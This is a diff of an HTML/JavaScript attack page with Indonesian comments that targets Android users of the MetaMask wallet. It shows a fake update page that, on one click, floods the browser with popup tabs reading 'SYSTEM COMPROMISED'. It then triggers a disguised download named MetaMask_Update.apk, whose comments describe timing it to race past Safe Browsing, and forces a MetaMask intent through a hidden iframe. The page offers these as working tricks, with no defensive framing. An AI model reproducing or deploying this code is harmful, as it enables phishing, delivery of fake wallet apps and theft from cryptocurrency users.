@@ -3,26 +3,26 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Update</title>
+<title>System Critical</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #f8f9fa; font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #000; color: #f00; font-family: monospace;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; cursor: pointer; text-align: center;
+    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
   }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border-top: 4px solid #ea4335; }
-  h2 { color: #333; margin-bottom: 10px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; }
+  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
+  h2 { animation: blink 0.5s infinite; }
+  @keyframes blink { 50% { opacity: 0.2; } }
+  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
   iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 System Update</h2>
-  <p>Klik di mana saja untuk memperbarui sistem.</p>
+  <h2>☢️ SYSTEM HACKED ☢️</h2>
+  <p>Klik di mana saja untuk memulai.</p>
   <div id="log">Sistem siap.</div>
 </div>
 
@@ -41,94 +41,116 @@
   }
 
   // ============================================
-  // 1. TARGET INTENT SCHEMES
+  // TARGET INTENT (METAMASK)
   // ============================================
-  // Ganti dengan target: MetaMask, Instagram, Settings, dll.
-  var targetIntent = "intent://#Intent;" +
-                     "package=io.metamask;" + // Ganti package sesuai target
-                     "scheme=metamask;" +
-                     "S.browser_fallback_url=" + encodeURIComponent("https://metamask.io/") + ";" +
-                     "end;";
+  var METAMASK_INTENT = "intent://#Intent;" +
+                        "package=io.metamask;" +
+                        "scheme=metamask;" +
+                        "S.browser_fallback_url=" + encodeURIComponent("https://metamask.io/") + ";" +
+                        "end;";
 
   // ============================================
-  // 2. TRIGGER RACE CONDITION
+  // TRIGGER (ONE CLICK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
     document.getElementById('main-card').innerHTML = `
-      <h2>Memproses...</h2>
-      <p>Mengunduh pembaruan & menyiapkan aplikasi...</p>
-      <div id="log">Memulai...</div>
+      <h2>EXECUTING...</h2>
+      <p>Memulai Chaos Burst...</p>
+      <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Blob Intent Race...");
+    log("[!] Chaos Burst Initiated...");
 
     // ============================================
-    // LANGKAH 1: BLOB DOWNLOAD (KAMUFLASE)
+    // TASK 1: MULTI-TAB FLOODING (ANDROID OPTIMIZED)
     // ============================================
-    try {
-      // Base64 APK (Dummy)
-      var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
-      var binary = atob(b64Apk);
-      var bytes = new Uint8Array(binary.length);
-      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-      
-      // MIME Type APK
-      var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
-      var url = URL.createObjectURL(blob);
-      
-      var a = document.createElement("a");
-      a.href = url;
-      a.download = "System_Update.apk";
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      
-      log("[+] APK Download Triggered (Camouflage).");
-    } catch(e) {
-      log("[-] APK Error: " + e.message);
-    }
-
-    // ============================================
-    // LANGKAH 2: INTENT HIJACK VIA IFRAME (RACE)
-    // ============================================
-    // Eksekusi dalam 0ms setelah APK mulai terunduh.
-    // Tujuannya agar Intent diproses sebelum Safe Browsing selesai memindai APK.
+    log("[+] Memulai Multi-Tab Flooding...");
+    var tabCount = 0;
     
-    setTimeout(function() {
+    // Di Android, popup blocker lebih ketat. Kita harus memicu klik langsung.
+    var tabInterval = setInterval(function() {
       try {
+        // Buka tab baru (Chrome Android akan membuka tab baru, bukan window baru)
+        var win = window.open('about:blank', '_blank');
+        if (win) {
+          // Isi tab dengan script (opsional)
+          win.document.write(`
+            <body style="background:#000;color:#f00;font-family:monospace;text-align:center;padding-top:20vh;">
+              <h1>SYSTEM COMPROMISED</h1>
+              <p>Tab ID: ${tabCount}</p>
+            </body>
+          `);
+          tabCount++;
+          log("[+] Tab " + tabCount + " dibuka.");
+        } else {
+          log("[-] Popup diblokir (Browser Limit).");
+          clearInterval(tabInterval);
+        }
+      } catch(e) {
+        clearInterval(tabInterval);
+      }
+
+      if (tabCount >= 5) { // Batasi 5 tab agar tidak langsung crash
+        clearInterval(tabInterval);
+        log("[!] Multi-Tab Flooding Selesai.");
+      }
+    }, 200); // Setiap 200ms
+
+    // ============================================
+    // TASK 2: BLOB APK DOWNLOAD RACE
+    // ============================================
+    setTimeout(function() {
+      log("[+] Memicu APK Download (Kamuflase)...");
+      try {
+        var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
+        var binary = atob(b64Apk);
+        var bytes = new Uint8Array(binary.length);
+        for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+        
+        var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
+        var url = URL.createObjectURL(blob);
+        
+        var a = document.createElement("a");
+        a.href = url;
+        a.download = "MetaMask_Update.apk";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      } catch(e) {}
+    }, 500);
+
+    // ============================================
+    // TASK 3: INTENT HIJACK (METAMASK)
+    // ============================================
+    setTimeout(function() {
+      log("[+] Memicu Intent MetaMask...");
+      try {
+        // Buat iframe sandbox
         var iframe = document.createElement("iframe");
-        // Meminta izin navigasi top-level
         iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
         iframe.style.display = "none";
-        
-        // Suntikkan Intent ke dalam iframe
         iframe.srcdoc = `
           <!DOCTYPE html>
           <html>
           <body>
             <script>
-              // Redirect ke aplikasi target
-              window.top.location.href = "${targetIntent}";
+              window.top.location.href = "${METAMASK_INTENT}";
             <\/script>
           </body>
           </html>
         `;
-        
         document.getElementById("launcher-container").appendChild(iframe);
-        log("[+] Intent Injected via Iframe.");
-        
-        // Fallback: Paksa Top-Level Redirect
-        setTimeout(function() {
-          window.location.href = targetIntent;
-        }, 100);
-
-      } catch(e) {
-        log("[-] Iframe Error: " + e.message);
-      }
-    }, 0); // 0ms (Race Super Cepat)
+      } catch(e) {}
+      
+      // Fallback Top-Level
+      setTimeout(function() {
+        window.location.href = METAMASK_INTENT;
+      }, 100);
+      
+    }, 1000);
 
   }, { once: true });
 
